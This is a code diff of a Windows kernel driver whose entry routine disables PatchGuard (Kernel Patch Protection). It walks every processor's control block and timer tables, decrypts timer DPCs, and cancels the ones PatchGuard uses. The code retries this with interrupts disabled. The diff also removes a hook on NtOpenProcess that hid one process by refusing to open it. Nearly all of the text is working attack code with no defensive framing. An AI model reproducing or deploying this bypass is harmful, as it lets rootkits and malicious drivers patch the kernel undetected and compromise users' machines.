@@ -34,122 +34,100 @@ PKDPC decrypt_dpc_routine(PKTIMER timer) {
 		)));
 }
 
-NTSTATUS NtOpenProcess_Hook(
-	_Out_ PHANDLE ProcessHandle,
-	_In_ ACCESS_MASK DesiredAccess,
-	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
-	_In_opt_ PCLIENT_ID ClientId
-) {
-	hook::disable_hook(&NtOpenProcess_Hook);
-
-	NTSTATUS status;
-
-	if (ClientId) {
-		ULONG pid = HandleToULong(ClientId->UniqueProcess);
-		if (pid == 4000) {
-			status = STATUS_ACCESS_DENIED;
-			hook::enable_hook(&NtOpenProcess_Hook);
-			return status;
-		}
-	}
-
-	status = NtOpenProcess(
-		ProcessHandle,
-		DesiredAccess,
-		ObjectAttributes,
-		ClientId
-	);
-
-	hook::enable_hook(&NtOpenProcess_Hook);
-
-	return status;
-}
-
 extern "C" NTSTATUS FxDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(DriverObject);
 	UNREFERENCED_PARAMETER(RegistryPath);
-
-	KAFFINITY active_processers = KeQueryActiveProcessors();
 	bool patchguard_disabled = false;
 
-	for (int core = 0; active_processers; core++, active_processers >>= 1) {
-		if (active_processers & 1) {
-			KeSetSystemAffinityThread(1ULL << core);
+	for (int i = 0; i < 5; i++) {
+		KAFFINITY active_processers = KeQueryActiveProcessors();
 
-			PKPRCB processer_block = KeGetCurrentPrcb();
-			if (!processer_block) {
-				continue;
-			}
+		_disable();
+		KeEnterCriticalRegion();
 
-			if (processer_block->AcpiReserved) {
-				PKDPC dpc = (PKDPC)processer_block->AcpiReserved;
-				if (KeRemoveQueueDpc(dpc)) {
-					patchguard_disabled = true;
+		for (int core = 0; active_processers; core++, active_processers >>= 1) {
+			if (active_processers & 1) {
+				KeSetSystemAffinityThread(1ULL << core);
+
+				PKPRCB processer_block = KeGetCurrentPrcb();
+				if (!processer_block) {
+					continue;
 				}
-			}
 
-			if (processer_block->HalReserved[7]) {
-				PKDPC dpc = (PKDPC)processer_block->HalReserved[7];
-				if (KeRemoveQueueDpc(dpc)) {
-					patchguard_disabled = true;
+				if (processer_block->AcpiReserved) {
+					PKDPC dpc = (PKDPC)processer_block->AcpiReserved;
+					if (KeRemoveQueueDpc(dpc)) {
+						patchguard_disabled = true;
+					}
 				}
-			}
 
-			PKTIMER_TABLE timer_table = &processer_block->TimerTable;
-			if (!timer_table || !MmIsAddressValid(timer_table)) {
-				continue;
-			}
-
-			PKTIMER_TABLE_ENTRY timer_entry = nullptr;
-
-			for (int wheel = 0; wheel < 2; wheel++) {
-				for (int entry = 0; entry < 256; entry++) {
-					timer_entry = &timer_table->TimerEntries[wheel][entry];
-					if (!timer_entry || !MmIsAddressValid(timer_entry)) {
-						continue;
+				if (processer_block->HalReserved[7]) {
+					PKDPC dpc = (PKDPC)processer_block->HalReserved[7];
+					if (KeRemoveQueueDpc(dpc)) {
+						patchguard_disabled = true;
 					}
+				}
 
-					PKTIMER timer = CONTAINING_RECORD(timer_entry->Entry.Flink, KTIMER, TimerListEntry);
-					if (!timer || !MmIsAddressValid(timer)) {
-						continue;
-					}
+				PKTIMER_TABLE timer_table = &processer_block->TimerTable;
+				if (!timer_table || !MmIsAddressValid(timer_table)) {
+					continue;
+				}
 
-					PKDPC dpc = (PKDPC)decrypt_dpc_routine(timer);
-					if (!dpc || !MmIsAddressValid(dpc)) {
-						continue;
-					}
+				PKTIMER_TABLE_ENTRY timer_entry = nullptr;
 
-					// common dpc method
-					if ((__int64)dpc->DeferredContext >> 47 != -1 && (__int64)dpc->DeferredContext >> 47 != 0) {
-						if (KeCancelTimer(timer)) {
-							patchguard_disabled = true;
+				for (int wheel = 0; wheel < 2; wheel++) {
+					for (int entry = 0; entry < 256; entry++) {
+						timer_entry = &timer_table->TimerEntries[wheel][entry];
+						if (!timer_entry || !MmIsAddressValid(timer_entry)) {
+							continue;
 						}
-					}
 
-					// only two dpc use this method
-					if ((unsigned __int64)(((__int64)dpc->DeferredContext >> 47) + 1) > 1) {
-						if (KeCancelTimer(timer)) {
-							patchguard_disabled = true;
+						PKTIMER timer = CONTAINING_RECORD(timer_entry->Entry.Flink, KTIMER, TimerListEntry);
+						if (!timer || !MmIsAddressValid(timer)) {
+							continue;
 						}
-					}
 
-					// FsRtlTruncateSmallMcb
-					__int64 result = ((__int64)dpc->DeferredContext >> 47) + 1;
-					if ((__int64)dpc->DeferredContext >> 47 != -1 && result != 1) {
-						if (KeCancelTimer(timer)) {
-							patchguard_disabled = true;
+						PKDPC dpc = (PKDPC)decrypt_dpc_routine(timer);
+						if (!dpc || !MmIsAddressValid(dpc)) {
+							continue;
+						}
+
+						// common dpc method
+						if ((__int64)dpc->DeferredContext >> 47 != -1 && (__int64)dpc->DeferredContext >> 47 != 0) {
+							if (KeCancelTimer(timer)) {
+								patchguard_disabled = true;
+							}
+						}
+
+						// only two dpc use this method
+						if ((unsigned __int64)(((__int64)dpc->DeferredContext >> 47) + 1) > 1) {
+							if (KeCancelTimer(timer)) {
+								patchguard_disabled = true;
+							}
+						}
+
+						// FsRtlTruncateSmallMcb
+						__int64 result = ((__int64)dpc->DeferredContext >> 47) + 1;
+						if ((__int64)dpc->DeferredContext >> 47 != -1 && result != 1) {
+							if (KeCancelTimer(timer)) {
+								patchguard_disabled = true;
+							}
 						}
 					}
 				}
 			}
 		}
+
+		_enable();
+		KeLeaveCriticalRegion();
 	}
 
 	if (!patchguard_disabled) {
 		DbgPrint("failed to disable patchguard \n");
 	}
-
-	DbgPrint("patchguard status ( %s ) \n", patchguard_disabled ? "disabled" : "enabled");
+	else {
+		DbgPrint("disabled patchguard \n");
+	}
 
 	return patchguard_disabled ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 }
